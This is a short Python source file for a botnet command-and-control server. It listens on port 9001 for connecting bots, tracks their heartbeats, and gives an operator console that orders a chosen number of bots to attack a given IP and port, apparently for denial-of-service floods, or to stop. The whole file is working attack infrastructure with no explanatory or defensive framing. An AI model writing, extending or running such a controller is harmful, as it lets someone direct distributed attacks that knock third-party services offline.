# cnc_server.py
import socket, threading, time
from datetime import datetime

bots = {}

def client_handler(conn, addr):
    ip = addr[0]
    bots[ip] = {"sock": conn, "connected_at": datetime.now(), "last_heartbeat": datetime.now()}
    try:
        while True:
            data = conn.recv(1024).decode()
            if data == "heartbeat":
                bots[ip]["last_heartbeat"] = datetime.now()
            elif data.startswith("done"):
                print(f"[DONE] {ip} -> {data}")
    except:
        pass
    finally:
        bots.pop(ip, None)
        conn.close()

def start_server():
    s = socket.socket()
    s.bind(('0.0.0.0', 9001))
    s.listen()
    print("C&C listening on port 9001...")
    while True:
        conn, addr = s.accept()
        threading.Thread(target=client_handler, args=(conn, addr), daemon=True).start()

def send_attack(method, ip, port, bot_count):
    for bot in list(bots.values())[:bot_count]:
        cmd = f"attack {method} {ip} {port}"
        try:
            bot["sock"].send(cmd.encode())
        except:
            continue

def send_stop(bot_count):
    for bot in list(bots.values())[:bot_count]:
        try:
            bot["sock"].send(b"stop")
        except:
            continue

if __name__ == "__main__":
    threading.Thread(target=start_server, daemon=True).start()
    while True:
        cmd = input("CNC> ")
        if cmd.startswith("attack"):
            _, method, ip, port, count = cmd.strip().split()
            send_attack(method, ip, int(port), int(count))
        elif cmd.startswith("stop"):
            _, count = cmd.strip().split()
            send_stop(int(count))
        elif cmd == "status":
            print(f"Connected bots: {len(bots)}")
            for ip, info in bots.items():
                print(f"{ip} | connected at {info['connected_at']}")
        else:
            print("Commands: status | attack <method> <ip> <port> <count> | stop <count>")
